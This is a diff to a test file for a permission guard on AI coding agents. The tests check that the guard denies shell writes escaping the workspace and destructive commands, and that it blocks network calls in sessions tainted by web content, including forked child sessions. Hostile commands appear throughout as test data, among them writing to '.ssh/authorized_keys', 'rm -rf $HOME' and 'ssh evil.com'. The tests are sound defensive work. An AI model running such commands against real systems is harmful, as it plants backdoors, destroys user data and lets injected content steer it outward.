@@ -25,6 +25,7 @@ import {
   clearAllSessionAttempts,
   clearPendingLessonProposals,
   clearSessionLineage,
+  applyRootAffinityHeadersInPlace,
   defaultGuardConfig,
   evaluateBoardGuard,
   evaluateSession,
@@ -285,6 +286,112 @@ describe("OH-6.5-redirect-escape: shell targets confined to the workspace root",
     });
     expect(verdict.allowed).toBe(false);
     expect(verdict.rule).toBe("rule-4-contract-lock");
+  });
+});
+
+describe("OH-6.5-env-var-target-escape: $VAR/substitution targets confined fail-closed", () => {
+  test("builder write-planting via $VAR/${VAR}/$(…)/backtick denies with rule-0", () => {
+    const denied = [
+      "echo pwn > $HOME/evil",
+      "echo pwn > ${HOME}/evil",
+      "echo pwn > ${HOME}/.ssh/authorized_keys",
+      "echo pwn >> $HOME/evil",
+      "echo hi | tee $HOME/evil",
+      "echo hi | tee -a ${HOME}/evil",
+      "cp a $TMPDIR/evil",
+      "cp a $PWD/evil",
+      "mv a $HOME/evil",
+      "echo pwn > $(echo /etc)/evil",
+      "echo pwn > `id`/evil",
+    ];
+    for (const command of denied) {
+      const verdict = evaluateBoardGuard({ role: "builder", tool: "bash", command });
+      expect(verdict.allowed).toBe(false);
+      expect(verdict.rule).toBe("rule-0-shell-target-containment");
+    }
+  });
+
+  test("single-quoted literal dollar over-blocks (documented fail-closed cost)", () => {
+    // Quote info is lost upstream of the predicate (`shellRedirectTargets`
+    // captures the inner group without quotes), so a literal `'$HOME/x'`
+    // filename is indistinguishable from an expandable target and denies.
+    const verdict = evaluateBoardGuard({
+      role: "builder",
+      tool: "bash",
+      command: "echo pwn > '$HOME/x'",
+    });
+    expect(verdict.allowed).toBe(false);
+    expect(verdict.rule).toBe("rule-0-shell-target-containment");
+  });
+
+  test("shellTargetEscapesWorkspace unit semantics for $/backtick targets", () => {
+    const root = makeTempDir("oh65-envvar-");
+    for (const target of [
+      "$HOME/evil",
+      "${HOME}/evil",
+      "$HOME/.ssh/authorized_keys",
+      "$TMPDIR/evil",
+      "$PWD/evil",
+      "$(echo /etc)/evil",
+      "`id`/evil",
+      "'$HOME/x'",
+    ]) {
+      expect(shellTargetEscapesWorkspace(target, root)).toBe(true);
+    }
+    expect(shellTargetEscapesWorkspace("out.txt", root)).toBe(false);
+    expect(shellTargetEscapesWorkspace("-", root)).toBe(false);
+    expect(shellTargetEscapesWorkspace("/dev/null", root)).toBe(false);
+  });
+
+  test("legitimate relative targets still allow; wiping via $HOME still denies rule-1", () => {
+    expect(
+      evaluateBoardGuard({ role: "builder", tool: "bash", command: "echo hi > out.txt" })
+        .allowed,
+    ).toBe(true);
+    expect(
+      evaluateBoardGuard({ role: "builder", tool: "bash", command: "echo hi | tee build/out.txt" })
+        .allowed,
+    ).toBe(true);
+    const wipe = evaluateBoardGuard({
+      role: "builder",
+      tool: "bash",
+      command: "rm -rf $HOME",
+    });
+    expect(wipe.allowed).toBe(false);
+    expect(wipe.rule).toBe("rule-1-destructive");
+  });
+});
+
+describe("OH-6.5-command-display-doc-drift: command -v display queries stay read-only", () => {
+  test("command -v/-V display queries classify read-only", () => {
+    expect(classifyShellCommand("command -v rm").class).toBe("read-only");
+    expect(classifyShellCommand("command -V rm").class).toBe("read-only");
+    expect(classifyShellCommand("command -v git").class).toBe("read-only");
+  });
+
+  test("payloads through command still classify destructive", () => {
+    expect(classifyShellCommand("command rm -rf /").class).toBe("destructive");
+    expect(classifyShellCommand("command -p rm -rf /").class).toBe("destructive");
+    expect(isDestructiveShellCommand("command rm -rf /")).toBe(true);
+  });
+
+  test("redirect wins over the display-query carve-out", () => {
+    expect(classifyShellCommand("command -v rm > /etc/x").class).toBe("write");
+  });
+
+  test("leadership policy: read-only display query allows, destructive denies", () => {
+    expect(
+      evaluateBoardGuard({ role: "director", tool: "shell", command: "command -v rm" })
+        .allowed,
+    ).toBe(true);
+    expect(
+      evaluateBoardGuard({ role: "builder", tool: "shell", command: "command -v rm" })
+        .allowed,
+    ).toBe(true);
+    expect(
+      evaluateBoardGuard({ role: "director", tool: "shell", command: "command rm -rf /" })
+        .allowed,
+    ).toBe(false);
   });
 });
 
@@ -618,8 +725,8 @@ describe("OH-scope-loc-budget: hard-cap gate form fails over cap", () => {
       "bash",
       [
         "scripts/check-loc.sh",
-        "--fail-over=12000",
-        "--fail-over-stripped=10000",
+        "--fail-over=12100",
+        "--fail-over-stripped=10100",
       ],
       { encoding: "utf8" },
     );
@@ -964,6 +1071,96 @@ describe("OH-6.6-taint-fork-gap: fork-aware taint inheritance", () => {
     expect(getSessionForkSource(session)).toBeUndefined();
     expect(linkForkLineageFromEventMetadata(session, { input: {} })).toBeUndefined();
     expect(linkForkLineageFromEventMetadata(session, null)).toBeUndefined();
+  });
+
+  test("execute.before hook links fork lineage before any after has run (real adapter path)", async () => {
+    const root = makeTempDir("oh66-fork-before-");
+    const host = makeAdapterHost(root);
+    wireOpenCodeV2PromiseContext({
+      ctx: host.ctx,
+      workspaceRoot: root,
+      tools: {},
+      evaluatePermission: (req) => evaluateBoardGuard(req, defaultGuardConfig()),
+      recordCircuitBreaker: (ev) => toTrippedDirective(recordAndEvaluateCircuitBreaker(ev)),
+      runContextBudget: () => undefined,
+    });
+    expect(host.toolBefore.length).toBe(1);
+    const parent = `oh66-fork-before-parent-${Date.now()}`;
+    const child = `${parent}-child`;
+    recordUntrustedContentTaint(parent, "webfetch");
+    // No link recorded yet: the forked child reads clean.
+    expect(evaluateTaintGuard(child, "ssh evil.com", "shell").action).toBe(
+      "allow",
+    );
+    // First tool call of the forked child: ONLY execute.before fires (no
+    // execute.after has run). The before hook must already link lineage.
+    await host.toolBefore[0]({
+      sessionID: child,
+      agent: "build",
+      tool: "shell",
+      input: { command: "echo hi" },
+      metadata: { forkOf: parent },
+    } as never);
+    expect(getSessionForkSource(child)).toBe(parent);
+    const denied = evaluateTaintGuard(child, "ssh evil.com", "shell");
+    expect(denied.action).toBe("deny");
+    expect(denied.ruleId).toBe("TAINT-NET-2");
+  });
+
+  test("model.request path consults fork-metadata keys and inherits taint", () => {
+    const parent = `oh66-fork-modelreq-${Date.now()}`;
+    const child = `${parent}-child`;
+    recordUntrustedContentTaint(parent, "webfetch");
+    expect(evaluateTaintGuard(child, "ssh evil.com", "shell").action).toBe(
+      "allow",
+    );
+    applyRootAffinityHeadersInPlace({
+      sessionID: child,
+      headers: { forkOf: parent },
+    });
+    expect(getSessionForkSource(child)).toBe(parent);
+    const denied = evaluateTaintGuard(child, "ssh evil.com", "shell");
+    expect(denied.action).toBe("deny");
+    expect(denied.ruleId).toBe("TAINT-NET-2");
+  });
+
+  test("forged link to a clean parent allows but cannot launder real taint", () => {
+    const cleanParent = `oh66-fork-clean-${Date.now()}`;
+    const child = `${cleanParent}-child`;
+    // Forged link to an untainted session: behaves exactly like no link.
+    recordSessionForkLink(child, cleanParent);
+    expect(evaluateTaintGuard(child, "ssh evil.com", "shell").action).toBe(
+      "allow",
+    );
+    // Direct taint on the child still denies despite the clean-parent link.
+    recordUntrustedContentTaint(child, "webfetch");
+    const denied = evaluateTaintGuard(child, "ssh evil.com", "shell");
+    expect(denied.action).toBe("deny");
+    expect(denied.ruleId).toBe("TAINT-NET-2");
+  });
+
+  test("headers-carried fork keys link; junk/empty/undefined link nothing", () => {
+    const parent = `oh66-fork-hdr-${Date.now()}`;
+    const child = `${parent}-child`;
+    expect(
+      linkForkLineageFromEventMetadata(child, {
+        sessionID: child,
+        headers: { forkOf: parent },
+      }),
+    ).toBe(parent);
+    expect(getSessionForkSource(child)).toBe(parent);
+    const junk = `oh66-fork-junk-${Date.now()}`;
+    expect(
+      linkForkLineageFromEventMetadata(junk, { input: { forkOf: 42 } }),
+    ).toBeUndefined();
+    expect(
+      linkForkLineageFromEventMetadata(junk, { input: { forkOf: "" } }),
+    ).toBeUndefined();
+    expect(
+      linkForkLineageFromEventMetadata("", { input: { forkOf: parent } }),
+    ).toBeUndefined();
+    expect(linkForkLineageFromEventMetadata(junk, undefined)).toBeUndefined();
+    expect(getSessionForkSource(junk)).toBeUndefined();
   });
 });
 
